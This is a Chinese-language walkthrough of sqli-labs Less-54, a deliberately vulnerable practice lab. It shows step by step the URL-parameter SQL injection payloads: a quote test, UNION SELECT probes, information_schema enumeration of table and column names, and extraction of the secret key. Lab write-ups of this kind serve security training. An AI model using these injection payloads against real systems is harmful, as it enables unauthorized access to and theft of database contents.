## sql-labs第五十四关

五十四关翻译页面的英文，得知只有十次输入机会，超过十次所有表名，列名，等等都会随机重置。id参数是单引号闭合就行。

![Less-54-02](.\img\8af33a53059d1ae86882ac4125639932.png)



~~~ cmd
?id=1
~~~

![Less-54-02](.\img\Less-54-02.PNG)



~~~ cmd
？id=1'
~~~

![Less-54-01](.\img\Less-54-01.PNG)

两者不同，由此可判断该处存在`sql`注入点



~~~ cmd
?id=-1 union select 1,2,3--+
~~~

可以联合注入，由此就是正常流程了

![Less-54-03](.\img\Less-54-03.PNG)



~~~ cmd
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
~~~

![Less-54-04](.\img\Less-54-04.PNG)

其中，这次的`table_name`是`D1LTYW5BW8`，对于每次运行网站该名都会改变



~~~ cmd
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='D1LTYW5BW8' and table_schema=database()--+
~~~

![Less-54-05](.\img\Less-54-05.PNG)



~~~ cmd
?id=-1' union select 1,group_concat(secret_6K0N),3 from D1LTYW5BW8--+
~~~

由此获得正确的key值

![Less-54-06](.\img\Less-54-06.PNG)



将获取的key值放到下面输入框点击提交，就完成所有步骤。